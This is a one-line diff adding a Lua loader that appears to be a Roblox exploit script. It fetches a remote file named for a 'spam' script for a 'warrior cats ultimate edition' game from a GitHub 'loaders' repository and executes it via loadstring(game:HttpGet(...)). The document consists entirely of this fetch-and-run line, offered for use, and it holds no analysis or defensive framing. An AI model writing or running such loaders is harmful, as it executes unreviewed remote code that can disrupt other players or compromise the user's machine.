@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/warrior-cats-ultimate-edition-spam3-gi1i3vewo134tw.lua"))()
